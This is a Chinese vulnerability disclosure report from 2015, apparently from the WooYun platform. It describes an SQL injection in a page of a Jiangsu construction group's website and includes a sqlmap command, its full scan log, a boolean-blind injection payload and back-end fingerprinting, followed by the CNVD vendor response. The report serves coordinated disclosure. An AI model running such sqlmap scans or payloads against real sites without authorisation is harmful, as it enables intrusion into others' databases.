wybug_title: 江苏省建工集团某页面存在SQL注射漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-24：	细节已通知厂商并且等待厂商处理中									2015-10-28：	厂商已经确认，细节仅向厂商公开									2015-11-07：	细节向核心白帽子及相关领域专家公开									2015-11-17：	细节向普通白帽子公开									2015-11-27：	细节向实习白帽子公开									2015-12-12：	细节向公众公开  简要描述： RT 详细说明：  sqlmap:
python sqlmap.py -u "http://**.**.**.**/about/index.asp?id=1" --table
得出：
[07:07:43] [INFO] testing connection to the target url[07:07:44] [INFO] testing if the url is stable, wait a few seconds[07:07:46] [INFO] url is stable[07:07:46] [INFO] testing if GET parameter 'id' is dynamic[07:07:46] [INFO] confirming that GET parameter 'id' is dynamic[07:07:46] [INFO] GET parameter 'id' is dynamic[07:07:47] [WARNING] reflective value(s) found and filtering out[07:07:47] [WARNING] heuristic test shows that GET parameter 'id' might not be injectable[07:07:47] [INFO] testing for SQL injection on GET parameter 'id'[07:07:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[07:07:49] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable [07:07:49] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[07:07:49] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[07:07:50] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[07:07:50] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[07:07:51] [INFO] testing 'MySQL > 5.0.11 stacked queries'[07:07:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[07:07:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[07:07:52] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[07:07:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[07:07:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[07:07:53] [INFO] testing 'Oracle AND time-based blind'[07:07:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[07:07:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other injection technique found[07:08:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[07:08:05] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[07:08:16] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 62 HTTP(s) requests:
结果：
---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 8724=8724---[07:08:57] [INFO] testing MySQL[07:08:57] [WARNING] the back-end DBMS is not MySQL[07:08:57] [INFO] testing Oracle[07:08:58] [WARNING] the back-end DBMS is not Oracle[07:08:58] [INFO] testing PostgreSQL[07:08:59] [WARNING] the back-end DBMS is not PostgreSQL[07:08:59] [INFO] testing Microsoft SQL Server[07:08:59] [WARNING] the back-end DBMS is not Microsoft SQL Server[07:08:59] [INFO] testing SQLite[07:09:00] [WARNING] the back-end DBMS is not SQLite[07:09:00] [INFO] testing Microsoft Access[07:09:00] [INFO] confirming Microsoft Access[07:09:00] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft Access

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-10-28 15:19 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给江苏分中心，由江苏分中心后续协调网站管理单位处置。  最新状态： 暂无
